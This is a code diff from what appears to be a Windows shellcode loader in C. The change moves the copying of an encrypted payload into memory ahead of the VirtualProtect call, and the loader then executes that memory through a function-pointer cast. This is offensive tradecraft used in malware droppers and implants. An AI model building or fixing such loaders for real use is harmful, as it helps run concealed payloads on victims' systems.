@@ -85,12 +85,12 @@ int main(void) {
 		return -1;
 	}
 
+    // Copy the encrypted payload into the allocated memory
+    memcpy(executable_memory, decoded_payload, decoded_payload_size);
 
     DWORD old_protect = NULL;
     VirtualProtect(executable_memory, decoded_payload_size, PAGE_EXECUTE_READ, &old_protect);
 
-    // Copy the encrypted payload into the allocated memory
-	memcpy(executable_memory, decoded_payload, decoded_payload_size);
 
     // Run the payload using pointer magic
 	(*(VOID(*)()) executable_memory)();
